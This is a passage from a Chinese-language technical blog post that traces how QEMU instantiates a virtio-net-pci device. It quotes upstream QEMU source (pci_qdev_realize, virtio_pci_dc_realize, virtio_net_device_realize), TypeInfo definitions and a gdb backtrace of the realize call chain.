two&quot;</span>, pci_dev-&gt;romsize);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* initialize cap_present for pci_is_express() and pci_config_size(),</span></span><br><span class="line"><span class="comment">     * Note that hybrid PCIs are not set automatically and need to manage</span></span><br><span class="line"><span class="comment">     * QEMU_PCI_CAP_EXPRESS manually */</span></span><br><span class="line">    <span class="keyword">if</span> (object_class_dynamic_cast(klass, INTERFACE_PCIE_DEVICE) &amp;&amp;</span><br><span class="line">       !object_class_dynamic_cast(klass, INTERFACE_CONVENTIONAL_PCI_DEVICE)) &#123;</span><br><span class="line">        pci_dev-&gt;cap_present |= QEMU_PCI_CAP_EXPRESS;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (object_class_dynamic_cast(klass, INTERFACE_CXL_DEVICE)) &#123;</span><br><span class="line">        pci_dev-&gt;cap_present |= QEMU_PCIE_CAP_CXL;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    pci_dev = do_pci_register_device(pci_dev,</span><br><span class="line">                                     object_get_typename(OBJECT(qdev)),</span><br><span class="line">                                     pci_dev-&gt;devfn, errp);</span><br><span class="line">    <span class="keyword">if</span> (pci_dev == <span class="literal">NULL</span>)</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (pc-&gt;realize) &#123;</span><br><span class="line">        pc-&gt;realize(pci_dev, &amp;local_err);</span><br><span class="line">        <span class="keyword">if</span> (local_err) &#123;</span><br><span class="line">            error_propagate(errp, local_err);</span><br><span class="line">            do_pci_unregister_device(pci_dev);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * A PCIe Downstream Port that do not have ARI Forwarding enabled must</span></span><br><span class="line"><span class="comment">     * associate only Device 0 with the device attached to the bus</span></span><br><span class="line"><span class="comment">     * representing the Link from the Port (PCIe base spec rev 4.0 ver 0.3,</span></span><br><span class="line"><span class="comment">     * sec 7.3.1).</span></span><br><span class="line"><span class="comment">     * With ARI, PCI_SLOT() can return non-zero value as the traditional</span></span><br><span class="line"><span class="comment">     * 5-bit Device Number and 3-bit Function Number fields in its associated</span></span><br><span class="line"><span class="comment">     * Routing IDs, Requester IDs and Completer IDs are interpreted as a</span></span><br><span class="line"><span class="comment">     * single 8-bit Function Number. Hence, ignore ARI capable devices.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">if</span> (pci_is_express(pci_dev) &amp;&amp;</span><br><span class="line">        !pcie_find_capability(pci_dev, PCI_EXT_CAP_ID_ARI) &amp;&amp;</span><br><span class="line">        pcie_has_upstream_port(pci_dev) &amp;&amp;</span><br><span class="line">        PCI_SLOT(pci_dev-&gt;devfn)) &#123;</span><br><span class="line">        warn_report(<span class="string">&quot;PCI: slot %d is not valid for %s,&quot;</span></span><br><span class="line">                    <span class="string">&quot; parent device only allows plugging into slot 0.&quot;</span>,</span><br><span class="line">                    PCI_SLOT(pci_dev-&gt;devfn), pci_dev-&gt;name);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (pci_dev-&gt;failover_pair_id) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!pci_bus_is_express(pci_get_bus(pci_dev))) &#123;</span><br><span class="line">            error_setg(errp, <span class="string">&quot;failover primary device must be on &quot;</span></span><br><span class="line">                             <span class="string">&quot;PCIExpress bus&quot;</span>);</span><br><span class="line">            pci_qdev_unrealize(DEVICE(pci_dev));</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        class_id = pci_get_word(pci_dev-&gt;config + PCI_CLASS_DEVICE);</span><br><span class="line">        <span class="keyword">if</span> (class_id != PCI_CLASS_NETWORK_ETHERNET) &#123;</span><br><span class="line">            error_setg(errp, <span class="string">&quot;failover primary device is not an &quot;</span></span><br><span class="line">                             <span class="string">&quot;Ethernet device&quot;</span>);</span><br><span class="line">            pci_qdev_unrealize(DEVICE(pci_dev));</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> ((pci_dev-&gt;cap_present &amp; QEMU_PCI_CAP_MULTIFUNCTION)</span><br><span class="line">            || (PCI_FUNC(pci_dev-&gt;devfn) != <span class="number">0</span>)) &#123;</span><br><span class="line">            error_setg(errp, <span class="string">&quot;failover: primary device must be in its own &quot;</span></span><br><span class="line">                              <span class="string">&quot;PCI slot&quot;</span>);</span><br><span class="line">            pci_qdev_unrealize(DEVICE(pci_dev));</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        qdev-&gt;allow_unplug_during_migration = <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* rom loading */</span></span><br><span class="line">    is_default_rom = <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">if</span> (pci_dev-&gt;romfile == <span class="literal">NULL</span> &amp;&amp; pc-&gt;romfile != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        pci_dev-&gt;romfile = g_strdup(pc-&gt;romfile);</span><br><span class="line">        is_default_rom = <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    pci_add_option_rom(pci_dev, is_default_rom, &amp;local_err);</span><br><span class="line">    <span class="keyword">if</span> (local_err) &#123;</span><br><span class="line">        error_propagate(errp, local_err);</span><br><span class="line">        pci_qdev_unrealize(DEVICE(pci_dev));</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    pci_set_power(pci_dev, <span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">    pci_dev-&gt;msi_trigger = pci_msi_trigger;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">virtio_pci_dc_realize</span><span class="params">(DeviceState *qdev, Error **errp)</span></span><br><span class="line">&#123;</span><br><span class="line">    VirtioPCIClass *vpciklass = VIRTIO_PCI_GET_CLASS(qdev);</span><br><span class="line">    VirtIOPCIProxy *proxy = VIRTIO_PCI(qdev);</span><br><span class="line">    PCIDevice *pci_dev = &amp;proxy-&gt;pci_dev;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!(proxy-&gt;flags &amp; VIRTIO_PCI_FLAG_DISABLE_PCIE) &amp;&amp;</span><br><span class="line">        virtio_pci_modern(proxy)) &#123;</span><br><span class="line">        pci_dev-&gt;cap_present |= QEMU_PCI_CAP_EXPRESS;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    vpciklass-&gt;parent_dc_realize(qdev, errp);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>可以看到，在实例化设备时，基于<a href="https://elixir.bootlin.com/qemu/v9.0.0-rc2/source/hw/core/qdev.c#L470"><strong>device_set_realized()</strong></a>，不停调用子类在类初始化时覆盖的<strong>realize</strong>函数指针/<strong>parent_dc_realize</strong>函数，从而完成最终的实例化。</p><p>具体的，由于<strong>virtio-net-pci设备</strong>属于<strong>Virtio Over PCI BUS</strong>，因此<strong>VirtIONetPCI</strong>对象中包含<strong>VirtIOPCIProxy</strong>对象，即<a href="https://elixir.bootlin.com/qemu/v9.0.0-rc2/source/hw/virtio/virtio-pci.c#L2719"><strong>virtio-pci-bus</strong>总线</a>的<strong>PCIDevice</strong>对象，其相关的实例化在<a href="https://elixir.bootlin.com/qemu/v9.0.0-rc2/source/hw/virtio/virtio-pci.c#L2272"><strong>virtio_pci_realize()</strong></a>，其分配了<strong>VIRTIO_PCI_CAP_COMMON_CFG</strong>、<strong>VIRTIO_PCI_CAP_ISR_CFG</strong>、<strong>VIRTIO_PCI_CAP_DEVICE_CFG</strong>和io的<strong>VIRTIO_PCI_CAP_NOTIFY_CFG</strong>等配置空间，并使用<a href="https://elixir.bootlin.com/qemu/v9.0.0-rc2/source/hw/virtio/virtio-pci.c#L2682"><strong>virtio_pci_bus_new()</strong></a>初始化<strong>VirtIOPCIProxy</strong>总线。但此时还未完成与<strong>guest驱动</strong>的协商，因此此时并不会正常使用，为了与<strong>guest驱动</strong>进行通信协商，还需要实例化<strong>virtio设备</strong>相关信息，其在<a href="https://elixir.bootlin.com/qemu/v9.0.0-rc2/source/hw/virtio/virtio-net-pci.c#L49"><strong>virtio_net_pci_realize()</strong></a>中通过实例化<strong>VirtIONet</strong>对象实现。该对象的<strong>TypeInfo</strong>变量是<a href="https://elixir.bootlin.com/qemu/v9.0.0-rc2/source/hw/net/virtio-net.c#L4052">virtio_net_info</a>，如下所示<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">const</span> TypeInfo virtio_net_info = &#123;</span><br><span class="line">    .name = TYPE_VIRTIO_NET,</span><br><span class="line">    .parent = TYPE_VIRTIO_DEVICE,</span><br><span class="line">    .instance_size = <span class="keyword">sizeof</span>(VirtIONet),</span><br><span class="line">    .instance_init = virtio_net_instance_init,</span><br><span class="line">    .class_init = virtio_net_class_init,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">const</span> TypeInfo virtio_device_info = &#123;</span><br><span class="line">    .name = TYPE_VIRTIO_DEVICE,</span><br><span class="line">    .parent = TYPE_DEVICE,</span><br><span class="line">    .instance_size = <span class="keyword">sizeof</span>(VirtIODevice),</span><br><span class="line">    .class_init = virtio_device_class_init,</span><br><span class="line">    .instance_finalize = virtio_device_instance_finalize,</span><br><span class="line">    .abstract = <span class="literal">true</span>,</span><br><span class="line">    .class_size = <span class="keyword">sizeof</span>(VirtioDeviceClass),</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></p><p>其<strong>class_init</strong>函数指针分别设置对应的父类<strong>realize</strong>函数指针为<a href="https://elixir.bootlin.com/qemu/v9.0.0-rc2/source/hw/virtio/virtio.c#L3738">virtio_device_realize()</a>和<a href="https://elixir.bootlin.com/qemu/v9.0.0-rc2/source/hw/net/virtio-net.c#L3656">virtio_net_device_realize()</a>，如下所示<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//#0  virtio_net_device_realize (dev=0x5555580c6260, errp=0x7fffffffd030) at ../../qemu/hw/net/virtio-net.c:3657</span></span><br><span class="line"><span class="comment">//#1  0x0000555555df39c2 in virtio_device_realize (dev=0x5555580c6260, errp=0x7fffffffd090) at ../../qemu/hw/virtio/virtio.c:3748</span></span><br><span class="line"><span class="comment">//#2  0x0000555555ea0d4e in device_set_realized (obj=0x5555580c6260, value=true, errp=0x7fffffffd360) at ../../qemu/hw/core/qdev.c:510</span></span><br><span class="line"><span class="comment">//#3  0x0000555555eac555 in property_set_bool (obj=0x5555580c6260, v=0x5555580d4190, name=0x555556300c31 &quot;realized&quot;, opaque=0x5555570fc6e0, errp=0x7fffffffd360) at ../../qemu/qom/object.c:2358</span></span><br><span class="line"><span class="comment">//#4  0x0000555555eaa0eb in object_property_set (obj=0x5555580c6260, name=0x555556300c31 &quot;realized&quot;, v=0x5555580d4190, errp=0x7fffffffd360) at ../../qemu/qom/object.c:1472</span></span><br><span class="line"><span class="comment">//#5  0x0000555555eaed24 in object_property_set_qobject (obj=0x5555580c6260, name=0x555556300c31 &quot;realized&quot;, value=0x5555580d40d0, errp=0x7fffffffd360) at ../../qemu/qom/qom-qobject.c:28</span></span><br><span class="line"><span class="comment">//#6  0x0000555555eaa4a4 in object_property_set_bool (obj=0x5555580c6260, name=0x555556300c31 &quot;realized&quot;, value=true, errp=0x7fffffffd360) at ../../qemu/qom/object.c:1541</span></span><br><span class="line"><span class="comment">//#7  0x0000555555ea0468 in qdev_realize (dev=0x5555580c6260, bus=0x5555580c61e0, errp=0x7fffffffd360) at ../../qemu/hw/core/qdev.c:292</span></span><br><span class="line"><span class="comment">//#8  0x0000555555e141a8 in virtio_net_pci_realize (vpci_dev=0x5555580bdd70, errp=0x7fffffffd360) at ../../qemu/hw/virtio/virtio-net-pci.c:64</span></span><br><span class="line"><span class="comment">//#9  0x0000555555b76de9 in virtio_pci_realize (pci_dev=0x5555580bdd70, errp=0x7fffffffd360) at ../../qemu/hw/virtio/virtio-pci.c:2407</span></span><br><span class="line"><span class="comment">//#10 0x0000555555a9cd61 in pci_qdev_realize (qdev=0x5555580bdd70, errp=0x7fffffffd420) at ../../qemu/hw/pci/pci.c:2093</span></span><br><span class="line"><span class="comment">//#11 0x0000555555b77204 in virtio_pci_dc_realize (qdev=0x5555580bdd70, errp=0x7fffffffd420) at ../../qemu/hw/virtio/virtio-pci.c:2501</span></span><br><span class="line"><span class="comment">//#12 0x0000555555ea0d4e in device_set_realized (obj=0x5555580bdd70, value=true, errp=0x7fffffffd690) at ../../qemu/hw/core/qdev.c:510</span></span><br><span class="line"><span class="comment">//#13 0x0000555555eac555 in property_set_bool (obj=0x5555580bdd70, v=0x5555580cdea0, name=0x555556300c31 &quot;realized&quot;, opaque=0x5555570fc6e0, errp=0x7fffffffd690) at ../../qemu/qom/object.c:2358</span></span><br><span class="line"><span class="comment">//#14 0x0000555555eaa0eb in object_property_set (obj=0x5555580bdd70, name=0x555556300c31 &quot;realized&quot;, v=0x5555580cdea0, errp=0x7fffffffd690) at ../../qemu/qom/object.c:1472</span></span><br><span class="line"><span class="comment">//#15 0x0000555555eaed24 in object_property_set_qobject (obj=0x5555580bdd70, name=0x555556300c31 &quot;realized&quot;, value=0x5555580cca90, errp=0x7fffffffd690) at ../../qemu/qom/qom-qobject.c:28</span></span><br><span class="line"><span class="comment">//#16 0x0000555555eaa4a4 in object_property_set_bool (obj=0x5555580bdd70, name=0x555556300c31 &quot;realized&quot;, value=true, errp=0x7fffffffd690) at ../../qemu/qom/object.c:1541</span></span><br><span class="line"><span class="comment">//#17 0x0000555555ea0468 in qdev_realize (dev=0x5555580bdd70, bus=0x555557430730, errp=0x7fffffffd690) at ../../qemu/hw/core/qdev.c:292</span></span><br><span class="line"><span class="comment">//#18 0x0000555555bd0329 in qdev_device_add_from_qdict (opts=0x5555580bc3b0, from_json=false, errp=0x7fffffffd690) at ../../qemu/system/qdev-monitor.c:718</span></span><br><span class="line"><span class="comment">//#19 0x0000555555bd03d9 in qdev_device_add (opts=0x5555570f7230, errp=0x55555706a160 &lt;error_fatal&gt;) at ../../qemu/system/qdev-monitor.c:737</span></span><br><span class="line"><span class="comment">//#20 0x0000555555bda4e7 in device_init_func (opaque=0x0, opts=0x5555570f7230, errp=0x55555706a160 &lt;error_fatal&gt;) at ../../qemu/system/vl.c:1200</span></span><br><span class="line"><span class="comment">//#21 0x00005555560c2a63 in qemu_opts_foreach (list=0x555556f53ec0 &lt;qemu_device_opts&gt;, func=0x555555bda4bc &lt;device_init_func&gt;, opaque=0x0, errp=0x55555706a160 &lt;error_fatal&gt;) at ../../qemu/util/qemu-option.c:1135</span></span><br><span class="line"><span class="comment">//#22 0x0000555555bde1b8 in qemu_create_cli_devices () at ../../qemu/system/vl.c:2637</span></span><br><span class="line"><span class="comment">//#23 0x0000555555bde3fe in qmp_x_exit_preconfig (errp=0x55555706a160 &lt;error_fatal&gt;) at ../../qemu/system/vl.c:2706</span></span><br><span class="line"><span class="comment">//#24 0x0000555555be0db6 in qemu_init (argc=39, argv=0x7fffffffdad8) at ../../qemu/system/vl.c:3739</span></span><br><span class="line"><span class="comment">//#25 0x0000555555e9b7ed in main (argc=39, argv=0x7fffffffdad8) at ../../qemu/system/main.c:47</span></span><br><span class="line"><span class="comment">//#26 0x00007ffff7629d90 in __libc_start_call_main (main=main@entry=0x555555e9b7c9 &lt;main&gt;, argc=argc@entry=39, argv=argv@entry=0x7fffffffdad8) at ../sysdeps/nptl/libc_start_call_main.h:58</span></span><br><span class="line"><span class="comment">//#27 0x00007ffff7629e40 in __libc_start_main_impl (main=0x555555e9b7c9 &lt;main&gt;, argc=39, argv=0x7fffffffdad8, init=&lt;optimized out&gt;, fini=&lt;optimized out&gt;, rtld_fini=&lt;optimized out&gt;, stack_end=0x7fffffffdac8) at ../csu/libc-start.c:392</span></span><br><span class="line"><span class="comment">//#28 0x000055555586f0d5 in _start ()</span></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">virtio_net_device_realize</span><span class="params">(DeviceState *dev, Error **errp)</span></span><br><span class="line">&#123;</span><br><span class="line">    VirtIODevice *vdev = VIRTIO_DEVICE(dev);</span><br><span class="line">    VirtIONet *n = VIRTIO_NET(dev);</span><br><span class="line">    NetClientState *nc;</span><br><span class="line">    <span class="type">int</span> i;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (n-&gt;net_conf.mtu) &#123;</span><br><span class="line">        n-&gt;host_features |= (<span class="number">1ULL</span> &lt;&lt; VIRTIO_NET_F_MTU);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (n-&gt;net_conf.duplex_str) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">strncmp</span>(n-&gt;net_conf.duplex_str, <span class="string">&quot;half&quot;</span>, <span class="number">5</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">            n-&gt;net_conf.duplex = DUPLEX_HALF;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="built_in">strncmp</span>(n-&gt;net_conf.duplex_str, <span class="string">&quot;full&quot;</span>, <span class="number">5</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">            n-&gt;net_conf.duplex = DUPLEX_FULL;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            error_setg(errp, <span class="string">&quot;&#x27;duplex&#x27; must be &#x27;half&#x27; or &#x27;full&#x27;&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        n-&gt;host_features |= (<span class="number">1ULL</span> &lt;&lt; VIRTIO_NET_F_SPEED_DUPLEX);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        n-&gt;net_conf.duplex = DUPLEX_UNKNOWN;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (n-&gt;net_conf.speed &lt; SPEED_UNKNOWN) &#123;</span><br><span class="line">        error_setg(errp, <span class="string">&quot;&#x27;speed&#x27; must be between 0 and INT_MAX&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (n-&gt;net_conf.speed &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">        n-&gt;host_features |= (<span class="number">1ULL</span> &lt;&lt; VIRTIO_NET_F_SPEED_DUPLEX);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (n-&gt;failover) &#123;</span><br><span class="line">        n-&gt;primary_listener.hide_device = failover_hide_primary_device;</span><br><span class="line">        qatomic_set(&amp;n-&gt;failover_primary_hidden, <span class="literal">true</span>);</span><br><span class="line">        device_listener_register(&amp;n-&gt;primary_listener);</span><br><span class="line">        migration_add_notifier(&amp;n-&gt;migration_state,</span><br><span class="line">                               virtio_net_migration_state_notifier);</span><br><span class="line">        n-&gt;host_features |= (<span class="number">1ULL</span> &lt;&lt; VIRTIO_NET_F_STANDBY);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    virtio_net_set_config_size(n, n-&gt;host_features);</span><br><span class="line">    virtio_init(vdev, VIRTIO_ID_NET, n-&gt;config_size);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * We set a lower limit on RX queue size to what it always was.</span></span><br><span class="line"><span class="comment">     * Guests that want a smaller ring can always resize it without</span></span><br><span class="line"><span class="comment">     * help from us (using virtio 1 and up).</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">if</span> (n-&gt;net_conf.rx_queue_size &lt; VIRTIO_NET_RX_QUEUE_MIN_SIZE ||</span><br><span class="line">        n-&gt;net_conf.rx_queue_size &gt; VIRTQUEUE_MAX_SIZE ||</span><br><span class="line">        !is_power_of_2(n-&gt;net_conf.rx_queue_size)) &#123;</span><br><span class="line">        error_setg(errp, <span class="string">&quot;Invalid rx_queue_size (= %&quot;</span> PRIu16 <span class="string">&quot;), &quot;</span></span><br><span class="line">                   <span class="string">&quot;must be a power of 2 between %d and %d.&quot;</span>,</span><br><span class="line">                   n-&gt;net_conf.rx_queue_size, VIRTIO_NET_RX_QUEUE_MIN_SIZE,</span><br><span class="line">                   VIRTQUEUE_MAX_SIZE);</span><br><span class="line">        virtio_cleanup(vdev);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (n-&gt;net_conf.tx_queue_size &lt; VIRTIO_NET_TX_QUEUE_MIN_SIZE ||</span><br><span class="line">        n-&gt;net_conf.tx_queue_size &gt; virtio_net_max_tx_queue_size(n) ||</span><br><span class="line">        !is_power_of_2(n-&gt;net_conf.tx_queue_size)) &#123;</span><br><span class="line">        error_setg(errp, <span class="string">&quot;Invalid tx_queue_size (= %&quot;</span> PRIu16 <span class="string">&quot;), &quot;</span></span><br><span class="line">                   <span class="string">&quot;must be a power of 2 between %d and %d&quot;</span>,</span><br><span class="line">                   n-&gt;net_conf.tx_queue_size, VIRTIO_NET_TX_QUEUE_MIN_SIZE,</span><br><span class="line">                   virtio_net_max_tx_queue_size(n));</span><br><span class="line">        virtio_cleanup(vdev);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    n-&gt;max_ncs = MAX(n-&gt;nic_conf.peers.queues, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * Figure out the datapath queue pairs since the backend could</span></span><br><span class="line"><span class="comment">     * provide control queue via peers as well.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">if</span> (n-&gt;nic_conf.peers.queues) &#123;</span><br><span class="line">        <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; n-&gt;max_ncs; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (n-&gt;nic_conf.peers.ncs[i]-&gt;is_datapath) &#123;</span><br><span class="line">                ++n-&gt;max_queue_pairs;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    n-&gt;max_queue_pairs = MAX(n-&gt;max_queue_pairs, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (n-&gt;max_queue_pairs * <span class="number">2</span> + <span class="number">1</span> &gt; VIRTIO_QUEUE_MAX) &#123;</span><br><span class="line">        error_setg(errp, <span class="string">&quot;Invalid number of queue pairs (= %&quot;</span> PRIu32 <span class="string">&quot;), &quot;</span></span><br><span class="line">                   <span class="string">&quot;must be a positive integer less than %d.&quot;</span>,</span><br><span class="line">                   n-&gt;max_queue_pairs, (VIRTIO_QUEUE_MAX - <span class="number">1</span>) / <span class="number">2</span>);</span><br><span class="line">        virtio_cleanup(vdev);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    n-&gt;vqs = g_new0(VirtIONetQueue, n-&gt;max_queue_pairs);</span><br><span class="line">    n-&gt;curr_queue_pairs = <span class="number">1</span>;</span><br><span class="line">    n-&gt;tx_timeout = n-&gt;net_conf.txtimer;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (n-&gt;net_conf.tx &amp;&amp; <span class="built_in">strcmp</span>(n-&gt;net_conf.tx, <span class="string">&quot;timer&quot;</span>)</span><br><span class="line">                       &amp;&amp; <span class="built_in">strcmp</span>(n-&gt;net_conf.tx, <span class="string">&quot;bh&quot;</span>)) &#123;</span><br><span class="line">        warn_report(<span class="string">&quot;virtio-net: 